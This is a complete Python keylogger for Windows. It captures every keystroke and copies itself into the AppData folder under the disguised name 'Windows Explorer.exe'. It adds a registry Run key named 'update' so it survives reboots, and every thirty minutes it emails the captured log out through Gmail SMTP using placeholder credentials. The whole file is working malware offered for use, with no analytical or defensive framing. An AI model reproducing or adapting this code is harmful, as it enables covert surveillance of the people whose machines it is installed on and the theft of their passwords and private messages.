import pynput
import threading
import smtplib
import os
import shutil
import sys
import subprocess

class Keylogger:
    def __init__(self, time_interval,email,password):
        self.become_persistent()
        self.log=" "
        self.interval=time_interval
        self.email=email
        self.password=password
    def become_persistent(self):
        evil_file_location=os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+ evil_file_location +'"' ,shell= True)


    def process_key_press(self, key):
        
        try:
            self.log+=str(key.char)
        except AttributeError:
            if key==key.space:
                self.log+=" "
            else:
                self.log+= "  "+ str(key) + "  "
        
    def report(self):
       
        self.send_mail(self.email,self.password,"\n\n" + self.log)
        self.log=" "
        timer=threading.Timer(self.interval,self.report)
        timer.start()

    def send_mail(self,email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
        keboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keboard_listener:
            self.report()
            keboard_listener.join()
   



my_keylogger=Keylogger(1800,"your-email@gmail.com","Your password")
my_keylogger.start()


